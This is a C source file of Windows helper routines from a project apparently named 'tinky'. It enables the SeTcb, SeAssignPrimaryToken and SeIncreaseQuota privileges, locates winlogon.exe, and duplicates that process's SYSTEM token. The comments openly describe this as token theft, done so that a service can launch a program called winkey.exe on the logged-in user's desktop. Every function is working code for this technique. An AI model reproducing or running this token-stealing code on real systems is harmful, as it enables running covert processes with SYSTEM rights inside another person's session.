/**
 * @file token.c
 * @brief Implementation of privilege management and process token manipulation helpers.
 */

#include "tinky.h"

/**
 * @brief Enables a specific Windows security privilege for a given process token.
 * 
 * Modifies the token privileges structure to enable the requested privilege.
 * 
 * @param hToken Handle to the access token that contains the privileges to be modified.
 * @param privName Name of the privilege to enable (e.g., SE_TCB_NAME).
 * @return BOOL TRUE on success, FALSE on failure.
 */
BOOL EnablePrivilege(HANDLE hToken, const char *privName)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
		printf("LookupPrivilegeValue(%s) failed (%lu)\n",
			   privName, (unsigned long)GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount           = 1;
	tp.Privileges[0].Luid       = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
		printf("AdjustTokenPrivileges(%s) failed (%lu)\n",
			   privName, (unsigned long)GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("Privilege %s not held by this process.\n", privName);
		return FALSE;
	}

	return TRUE;
}

/**
 * @brief Enables the required security privileges (SeTcbPrivilege, SeAssignPrimaryTokenPrivilege,
 *        SeIncreaseQuotaPrivilege) on the current process token to allow for token theft.
 * 
 * These privileges are necessary to open system processes like winlogon.exe, steal and duplicate
 * their primary tokens, and launch processes on behalf of other users/sessions.
 * 
 * @return BOOL TRUE if all privileges were enabled, FALSE otherwise.
 */
BOOL EnableRequiredPrivileges(void)
{
	HANDLE hToken;
	BOOL ok;

	if (!OpenProcessToken(GetCurrentProcess(),
						  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		printf("OpenProcessToken (self) failed (%lu)\n", (unsigned long)GetLastError());
		return FALSE;
	}

	ok  = EnablePrivilege(hToken, SE_TCB_NAME);
	ok &= EnablePrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
	ok &= EnablePrivilege(hToken, SE_INCREASE_QUOTA_NAME);

	CloseHandle(hToken);
	return ok;
}

/**
 * @brief Iterates through active processes to find the PID matching a given executable name.
 * 
 * Uses CreateToolhelp32Snapshot to securely list processes on the system and matches against
 * the processName without case sensitivity.
 * 
 * @param processName The name of the process to find (e.g., "winlogon.exe").
 * @return DWORD The Process ID if found, or 0 if not found.
 */
DWORD FindProcessId(const char *processName)
{
	PROCESSENTRY32 pe;
	DWORD found = 0;

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed (%lu)\n", (unsigned long)GetLastError());
		return 0;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnap, &pe)) {
		do {
			if (_stricmp(pe.szExeFile, processName) == 0) {
				found = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnap, &pe));
	}

	CloseHandle(hSnap);
	return found;
}

/**
 * @brief Locates "winlogon.exe", opens its process, steals its SYSTEM token, and duplicates it.
 * 
 * "winlogon.exe" runs in Session 1 as SYSTEM. Stealing its token allows our service to run
 * interactive programs (like winkey.exe) on the logged-in user's desktop session.
 * 
 * @return HANDLE Duplicate primary token with SYSTEM privileges, or NULL on failure.
 */
HANDLE StealWinlogonToken(void)
{
	DWORD winlogonPid = FindProcessId("winlogon.exe");
	if (winlogonPid == 0) 
	{
		printf("winlogon.exe not found\n");
		return NULL;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPid);
	if (!hProcess) {
		printf("OpenProcess(winlogon) failed (%lu)\n", (unsigned long)GetLastError());
		return NULL;
	}

	HANDLE hToken = NULL;
	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
		printf("OpenProcessToken(winlogon) failed (%lu)\n", (unsigned long)GetLastError());
		CloseHandle(hProcess);
		return NULL;
	}
	CloseHandle(hProcess);

	HANDLE hDupToken = NULL;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
						   SecurityImpersonation, TokenPrimary, &hDupToken)) {
		printf("DuplicateTokenEx failed (%lu)\n", (unsigned long)GetLastError());
		CloseHandle(hToken);
		return NULL;
	}
	CloseHandle(hToken);

	return hDupToken;
}
